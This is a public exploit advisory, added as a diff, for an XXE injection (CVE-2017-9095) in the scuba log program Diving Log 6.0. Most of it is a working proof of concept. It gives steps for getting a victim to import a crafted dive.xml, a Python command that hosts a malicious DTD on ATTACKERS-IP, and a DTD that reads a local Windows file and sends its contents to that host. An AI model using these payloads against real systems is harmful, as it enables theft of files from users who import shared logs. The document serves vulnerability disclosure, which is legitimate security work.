@@ -1,0 +1,75 @@
+[+] Exploit Title: Diving Log 6.0 XXE Injection
+[+] Date: 27-11-2017
+[+] Exploit Author: Trent Gordon
+[+] Vendor Homepage: http://www.divinglog.de
+[+] Software Link: http://www.divinglog.de/english/download/
+[+] Disclosed at: https://thenopsled.com/divinglog.txt
+[+] Version: 6.0
+[+] Tested on: Windows 7 SP1, Windows 10
+[+] CVE: CVE-2017-9095
+
+==================
+Background:
+==================
+Diving Log 6.0 is a scuba diving log software that manages and consolidates logs from other disparate sources.  Many scuba diving log software programs export their data in an XML file. 
+
+==================
+Vulnerability:
+==================
+By having a user import a crafted dive.xml file (very common, many divers share logs), it is possible to execute a XXE injection which retrieves local files and exfiltrates them to a remote attacker.
+1.)Open Diving Log 6.0
+2.)Close "Welcome Center" popup and select "Import" from the bottom left corner
+3.)Select "Subsurface" from the list of import data types.
+4.)"Open File" and select the crafted dive.xml file (with listener open on ATTACKERS-IP)
+
+==================
+Proof of Concept:
+==================
+
+a.) python -m SimpleHTTPServer 9999 (listening on ATTACKERS-IP and hosting payload.dtd)
+
+b.) Hosted "payload.dtd"
+
+<?xml version="1.0" encoding="utf-8" ?>
+<!ENTITY % data SYSTEM "file:///c:/windows/system.ini">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKERS-IP?%data;'>">
+
+
+c.) Exploited "dive.xml"
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % sp SYSTEM "http://ATTACKERS-IP/payload.dtd">
+%sp;
+%param1;
+%exfil;
+]>
+<divelog program='subsurface' version='3'>
+<settings>
+</settings>
+<divesites>
+<site uuid='33a32a07' name='hacked'>
+</site>
+</divesites>
+<dives>
+<dive number='1' divesiteid='33a32a07' date='2017-05-15' time='14:49:10' duration='46:00 min'>
+  <notes></notes>
+  <cylinder size='11.1 l' workpressure='207.0 bar' description='unknown' />
+  <divecomputer model='manually added dive'>
+  <depth max='15.0 m' mean='13.37 m' />
+  <surface pressure='1.013 bar' />
+  <sample time='0:00 min' depth='0.0 m' />
+  <sample time='3:00 min' depth='15.0 m' />
+  <sample time='40:00 min' depth='15.0 m' />
+  <sample time='42:00 min' depth='5.0 m' />
+  <sample time='45:00 min' depth='5.0 m' />
+  <sample time='46:00 min' depth='0.0 m' />
+  </divecomputer>
+</dive>
+</dives>
+</divelog>
+
+==================
+Additional Attack Vectors:
+==================
+I tested and exploited the "subsurface" import option, however MANY other dive log software programs use XML and most are available as Import options in Diving Log 6.0.  This XXE injection vulnerability is most likely vulnerable in every import option that utilizes XML for the underlying custom file format(.UDCF and .UDDF, for example).
